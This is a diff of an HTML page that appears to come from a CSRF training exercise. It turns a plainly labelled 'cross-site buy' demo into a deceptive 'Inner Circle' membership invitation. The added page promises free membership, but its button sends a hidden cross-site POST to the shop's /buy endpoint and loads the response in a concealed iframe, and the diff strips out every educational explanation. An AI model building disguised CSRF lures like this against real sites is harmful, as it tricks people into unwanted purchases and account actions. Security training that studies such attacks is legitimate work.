@@ -3,63 +3,154 @@
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1" />
-    <title>Cross-site buy (exercise 5)</title>
+    <title>Invitation — Inner Circle</title>
     <style>
+      :root {
+        color: #1a2b44;
+        background: #0f1419;
+      }
       body {
-        font-family: system-ui, sans-serif;
-        max-width: 36rem;
-        margin: 2rem auto;
+        font-family: "Segoe UI", system-ui, sans-serif;
+        max-width: 26rem;
+        margin: 0 auto;
+        padding: 2rem 1.15rem 2.5rem;
         line-height: 1.5;
+        min-height: 100vh;
+        box-sizing: border-box;
       }
-      form {
-        margin-top: 1.5rem;
+      .wrap {
+        background: linear-gradient(180deg, #faf8f3 0%, #fff 40%);
+        border-radius: 14px;
+        padding: 1.6rem 1.35rem 1.4rem;
+        box-shadow: 0 12px 40px rgba(0, 0, 0, 0.35);
+        border: 1px solid #d4a574;
       }
-      button {
-        font: inherit;
-        padding: 0.5rem 1rem;
-        cursor: pointer;
+      .seal {
+        width: 48px;
+        height: 48px;
+        margin: 0 auto 1rem;
+        border-radius: 50%;
+        background: #1a2b44;
+        color: #d4a574;
+        font-size: 1.35rem;
+        line-height: 48px;
+        text-align: center;
+        font-family: Georgia, serif;
+      }
+      .pill {
+        display: block;
+        text-align: center;
+        font-size: 0.68rem;
+        font-weight: 700;
+        letter-spacing: 0.12em;
+        text-transform: uppercase;
+        color: #92400e;
+        margin-bottom: 0.65rem;
+      }
+      h1 {
+        font-family: Georgia, "Times New Roman", serif;
+        font-size: 1.45rem;
+        font-weight: 600;
+        margin: 0 0 0.55rem;
+        text-align: center;
+        line-height: 1.25;
+        color: #1a2b44;
+      }
+      .sub {
+        color: #4b5563;
+        font-size: 0.92rem;
+        margin: 0 0 1.15rem;
+        text-align: center;
+      }
+      ul.perks {
+        margin: 0 0 1.1rem;
+        padding: 0;
+        list-style: none;
+        font-size: 0.88rem;
+        color: #374151;
+      }
+      ul.perks li {
+        padding: 0.4rem 0 0.4rem 1.6rem;
+        position: relative;
+        border-bottom: 1px solid #f0ebe3;
+      }
+      ul.perks li:last-child {
+        border-bottom: none;
+      }
+      ul.perks li::before {
+        content: "✓";
+        position: absolute;
+        left: 0;
+        color: #1a2b44;
+        font-weight: 700;
       }
       .note {
-        font-size: 0.9rem;
-        color: #4b5563;
-        border-left: 3px solid #d4a574;
-        padding-left: 0.75rem;
-        margin: 1rem 0;
+        font-size: 0.8rem;
+        color: #6b7280;
+        background: #f3f6fa;
+        border-radius: 8px;
+        padding: 0.6rem 0.75rem;
+        margin-bottom: 1.05rem;
+        text-align: center;
+      }
+      .note strong {
+        color: #1a2b44;
+      }
+      button {
+        width: 100%;
+        font: inherit;
+        font-size: 1.02rem;
+        font-weight: 600;
+        padding: 0.8rem 1rem;
+        cursor: pointer;
+        color: #faf8f3;
+        background: linear-gradient(180deg, #2a3f5f 0%, #1a2b44 100%);
+        border: 1px solid #d4a574;
+        border-radius: 10px;
+      }
+      button:hover {
+        background: linear-gradient(180deg, #324a6e 0%, #243a5c 100%);
+      }
+      .fine {
+        margin-top: 0.7rem;
+        font-size: 0.68rem;
+        color: #9ca3af;
+        text-align: center;
+        line-height: 1.45;
+      }
+      footer {
+        margin-top: 1.25rem;
+        font-size: 0.72rem;
+        color: #6b7280;
+        text-align: center;
       }
     </style>
   </head>
   <body>
-    <h1>Another site</h1>
-    <p>
-      This page is <strong>not</strong> served by the shop. You host it yourself so the request to the
-      shop is <strong>cross-site</strong>.
-    </p>
-    <div class="note">
-      <p><strong>How to open this file</strong></p>
-      <ul>
-        <li>
-          Open it directly (<code>file://…/cross-site.html</code>), <em>or</em>
-        </li>
-        <li>
-          Serve this folder from another origin, e.g.
-          <code>python3 -m http.server 8080</code> then
-          <code>http://127.0.0.1:8080/cross-site.html</code>.
-        </li>
-      </ul>
-      <p>
-        Sign in on the shop at <code>http://localhost:3001</code> first. Use the same shop URL in the
-        form below.
+    <div class="wrap">
+      <div class="seal" aria-hidden="true">◆</div>
+      <span class="pill">Personal invitation</span>
+      <h1>Join the Inner Circle</h1>
+      <p class="sub">
+        You were selected for our exclusive member club — private events, early access, and partner perks
+        linked to your existing shop account.
       </p>
+      <ul class="perks">
+        <li>Members-only newsletter and previews</li>
+        <li>Priority access to partner offers</li>
+        <li>No separate password — uses your shop sign-in</li>
+      </ul>
+      <p class="note">
+        <strong>One step left:</strong> accept below to activate membership on the account you’re signed
+        in with at the member shop.
+      </p>
+      <iframe name="club-checkout" hidden title=""></iframe>
+      <form action="http://localhost:3001/buy" method="POST" target="club-checkout">
+        <input type="hidden" name="bookId" value="1" />
+        <button type="submit">Accept invitation &amp; join</button>
+      </form>
+      <p class="fine">Membership is free for invited readers. You can leave the club anytime from shop settings.</p>
     </div>
-    <p>
-      The button sends a cross-site <code>POST</code> with no JavaScript. The response loads in a hidden
-      frame; check <code>/members</code> on the shop tab.
-    </p>
-    <iframe name="shop-response" hidden title="Shop response"></iframe>
-    <!-- Exercise 5: cross-site POST. OWASP A01; CWE-352 CSRF; CWE-1275 SameSite. -->
-    <form action="http://localhost:3001/buy" method="POST" target="shop-response">
-      <input type="hidden" name="bookId" value="1" />
-      <button type="submit">Buy the book for me</button>
-    </form>
+    <footer>Inner Circle · by invitation only</footer>
   </body>
 </html>
